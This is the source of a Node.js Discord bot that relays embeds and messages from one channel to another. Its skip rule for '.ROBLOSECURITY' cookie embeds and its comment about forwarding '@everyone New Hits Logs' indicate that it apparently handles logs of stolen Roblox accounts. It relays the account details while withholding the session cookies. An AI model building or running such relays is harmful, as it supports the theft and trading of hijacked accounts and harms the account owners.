const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// ─── CONFIG (set these in Railway → Variables) ────────────────────────────────
const BOT_TOKEN         = process.env.BOT_TOKEN;
const SOURCE_CHANNEL_ID = process.env.SOURCE_CHANNEL_ID;
const TARGET_CHANNEL_ID = process.env.TARGET_CHANNEL_ID;

if (!BOT_TOKEN || !SOURCE_CHANNEL_ID || !TARGET_CHANNEL_ID) {
  console.error('❌ Missing env vars: BOT_TOKEN, SOURCE_CHANNEL_ID, TARGET_CHANNEL_ID');
  process.exit(1);
}
// ──────────────────────────────────────────────────────────────────────────────

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`👁  Watching: ${SOURCE_CHANNEL_ID}`);
  console.log(`📤 Forwarding to: ${TARGET_CHANNEL_ID}`);
});

client.on('messageCreate', async (message) => {
  if (message.channel.id !== SOURCE_CHANNEL_ID) return;
  if (!message.embeds || message.embeds.length === 0) return;

  const targetChannel = await client.channels.fetch(TARGET_CHANNEL_ID).catch(() => null);
  if (!targetChannel) return console.error('❌ Target channel not found.');

  for (const embed of message.embeds) {
    // Skip the .ROBLOSECURITY cookie embed
    const embedText = [
      embed.title,
      embed.description,
      embed.author?.name,
      ...(embed.fields?.map(f => f.value) ?? []),
    ].filter(Boolean).join(' ');

    if (embedText.includes('ROBLOSECURITY') || embedText.includes('WARNING:-DO-NOT-SHARE')) {
      console.log('⏭  Skipped ROBLOSECURITY embed');
      continue;
    }

    // Rebuild the embed (Discord doesn't allow forwarding raw embeds directly)
    const rebuilt = new EmbedBuilder();

    if (embed.title)       rebuilt.setTitle(embed.title);
    if (embed.description) rebuilt.setDescription(embed.description);
    if (embed.color)       rebuilt.setColor(embed.color);
    if (embed.url)         rebuilt.setURL(embed.url);
    if (embed.timestamp)   rebuilt.setTimestamp(new Date(embed.timestamp));

    if (embed.author) {
      rebuilt.setAuthor({
        name:    embed.author.name    || '',
        iconURL: embed.author.iconURL || undefined,
        url:     embed.author.url     || undefined,
      });
    }

    if (embed.footer) {
      rebuilt.setFooter({
        text:    embed.footer.text    || '',
        iconURL: embed.footer.iconURL || undefined,
      });
    }

    if (embed.thumbnail?.url) rebuilt.setThumbnail(embed.thumbnail.url);
    if (embed.image?.url)     rebuilt.setImage(embed.image.url);

    if (embed.fields?.length) {
      rebuilt.addFields(embed.fields.map(f => ({
        name:   f.name,
        value:  f.value,
        inline: f.inline ?? false,
      })));
    }

    await targetChannel.send({ embeds: [rebuilt] }).catch(console.error);
  }

  // Also forward plain content (e.g. @everyone New Hits Logs)
  if (message.content) {
    await targetChannel.send(message.content).catch(console.error);
  }
});

client.login(BOT_TOKEN);
